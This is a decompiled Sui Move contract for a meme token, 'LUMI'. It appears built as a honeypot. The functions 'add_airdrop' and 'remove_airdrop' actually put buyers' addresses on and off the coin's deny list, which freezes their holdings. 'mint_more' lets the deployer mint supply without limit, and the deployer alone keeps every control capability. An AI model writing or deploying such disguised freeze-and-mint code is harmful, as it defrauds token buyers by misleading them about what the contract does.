module 0x6663308e96a22c119d1821a0b32bab6ebcef86464eb6c0a079265c36e784adcf::LUMI {
    struct LUMI has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LUMI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<LUMI>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: LUMI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<LUMI>(arg0, 6, b"LUMI", b"Sui Luminous", b"the friendly brightest yellow creature that knows how to turn up the fun", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://gateway.irys.xyz/gYHpWAePb0DnW_vEAKBriLzqMpXnaSgDyiNiC66es48?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<LUMI>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<LUMI>>(0x2::coin::mint<LUMI>(&mut v3, 10000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<LUMI>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<LUMI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_more(arg0: &mut 0x2::coin::TreasuryCap<LUMI>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<LUMI>>(0x2::coin::mint<LUMI>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LUMI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<LUMI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

